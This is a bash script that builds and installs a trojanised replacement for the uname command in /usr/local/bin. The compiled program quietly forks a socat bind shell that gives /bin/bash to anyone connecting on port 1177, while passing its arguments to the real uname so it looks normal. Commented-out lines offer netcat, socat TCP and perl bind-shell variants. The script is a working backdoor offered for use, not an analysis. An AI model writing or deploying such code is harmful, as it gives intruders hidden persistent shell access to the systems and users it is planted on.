#!/bin/bash

#uname
#------------------------
touch /tmp/.uname.c

cat <<EOF >> /tmp/.uname.c

#include <sys/types.h>

int main(int a,char**b){
  pid_t child_pid = fork();
  if(child_pid == 0) {
    /* char*d[999999]={"sh","-c","nc.traditional -l -v -p 4444 -e /bin/bash 2>/dev/null &"}; */
    /* char*d[999999]={"sh","-c","socat TCP4-Listen:3177,fork EXEC:/bin/bash 2>/dev/null &"}; */
    char*d[999999]={"sh","-c","socat SCTP-Listen:1177,fork EXEC:/bin/bash 2>/dev/null &"};
    /* char*d[999999]={"sh","-c","perl -MIO -e'$s=new IO::Socket::INET(LocalPort=>1337,Listen=>1);while($c=$s->accept()){$_=<$c>;print $c `$_`;}' 2>/dev/null &"}; */
    execv("/bin/sh",d);
    exit(0);
  }
  else {
    char*c[999999]={"sh","-c","/bin/uname \$*"};
    memcpy(c+3,b,8*a);
    execv("/bin/sh",c);
  }
}
EOF

gcc -xc /tmp/.uname.c -o /usr/local/bin/uname

rm /tmp/.uname.c
